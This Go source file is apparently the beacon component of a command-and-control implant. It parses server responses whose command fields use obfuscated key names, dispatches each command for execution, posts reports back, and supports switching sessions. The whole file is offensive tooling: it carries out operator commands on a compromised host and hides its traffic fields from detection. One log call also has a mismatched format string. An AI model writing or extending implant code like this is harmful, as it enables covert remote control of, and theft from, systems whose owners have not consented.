package beaconhandler

import (
	"encoding/json"
	"fmt"
	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/config"
	"src/Client/generic/logger"
)

// HandleResponse is the entry point for processing a server's response.
// It is typically called in a new goroutine from the main Beacon loop.
func HandleResponse(responseBody string) bool {
	logger.Log("Handling server response.")

	// 1. Parse the initial server response.
	serverResponse, err := parseServerResponse(responseBody)
	if err != nil {
		logger.Error("Critical error parsing server response: " + err.Error())
		return false
	}

	if len(serverResponse.Commands) == 0 {
		logger.Log("No commands received in response.")
		return false
	}

	reports, switchSession := processCommands(serverResponse.Commands)

	// 3. Post the generated reports back to the server.
	if err := postReportsToServer(reports); err != nil {
		logger.Error("Failed to post reports to server: " + err.Error())
	}
	return switchSession
}

// parseServerResponse unmarshals the raw JSON string from the server.
func parseServerResponse(responseBody string) (httpFuncs.ServerResponseWithCommands, error) {
	var root map[string]json.RawMessage
	if err := json.Unmarshal([]byte(responseBody), &root); err != nil {
		return httpFuncs.ServerResponseWithCommands{Commands: []httpFuncs.CommandData{{Command: "", CommandUUID: "", Data: nil}}}, fmt.Errorf("JSON unmarshal failed: %w. Body: %s", err, responseBody)
	}

	rawCommands, ok := root[config.Obfuscation.Generic.Commands.Name]
	if !ok || len(rawCommands) == 0 {
		logger.Log("No 'commands' array present in response; treating as empty command list.")
		return httpFuncs.ServerResponseWithCommands{Commands: []httpFuncs.CommandData{}}, nil
	}

	var items []json.RawMessage
	if err := json.Unmarshal(rawCommands, &items); err != nil {
		return httpFuncs.ServerResponseWithCommands{Commands: []httpFuncs.CommandData{}}, fmt.Errorf("commands array unmarshal failed: %w", err)
	}

	// Resolve obfuscated keys strictly from config (no fallback to plain names)
	cfg := config.Obfuscation.Generic.Commands
	uuidKey := cfg.CommandUUID
	cmdKey := cfg.Command
	dataKey := cfg.Data
	if uuidKey == "" || cmdKey == "" || dataKey == "" {
		return httpFuncs.ServerResponseWithCommands{Commands: []httpFuncs.CommandData{}}, fmt.Errorf("obfuscation config missing required keys (uuid:'%s', command:'%s', data:'%s')", uuidKey, cmdKey, dataKey)
	}

	out := httpFuncs.ServerResponseWithCommands{Commands: make([]httpFuncs.CommandData, 0, len(items))}
	for _, it := range items {
		var m map[string]json.RawMessage
		if err := json.Unmarshal(it, &m); err != nil {
			logger.Warn(fmt.Sprintf("Skipping command item due to unmarshal error: %v", err))
			continue
		}
		var c httpFuncs.CommandData

		// Strictly read only the obfuscated keys; if required keys are missing, skip the item.
		uuidVal, hasUUID := m[uuidKey]
		cmdVal, hasCmd := m[cmdKey]
		if !hasUUID || !hasCmd {
			logger.Warn(fmt.Sprintf("Skipping command item: missing required obfuscated keys %s: Expected: %s", m))
			continue
		}
		if err := json.Unmarshal(uuidVal, &c.CommandUUID); err != nil {
			logger.Warn(fmt.Sprintf("Skipping command item: invalid uuid value: %v", err))
			continue
		}
		if err := json.Unmarshal(cmdVal, &c.Command); err != nil {
			logger.Warn(fmt.Sprintf("Skipping command item: invalid command value: %v", err))
			continue
		}
		if v, ok := m[dataKey]; ok {
			// Preserve as raw JSON payload
			c.Data = v
		}

		out.Commands = append(out.Commands, c)
	}

	logger.Log(fmt.Sprintf("Successfully parsed response with %d command(s).", len(out.Commands)))
	return out, nil
}

// processCommands iterates through a list of commands, executes them,
// and returns a list of reports.
func processCommands(commands []httpFuncs.CommandData) ([]httpFuncs.CommandReport, bool) {
	var reports []httpFuncs.CommandReport
	var switchSession bool
	logger.Log(fmt.Sprintf("Received %d commands to process.", len(commands)))
	for i, command := range commands {
		logger.Log(fmt.Sprintf("Processing command: %d", i+1))
		report, session := executeCommand(command)
		reports = append(reports, report)
		if session {
			switchSession = true
		}
	}
	return reports, switchSession
}
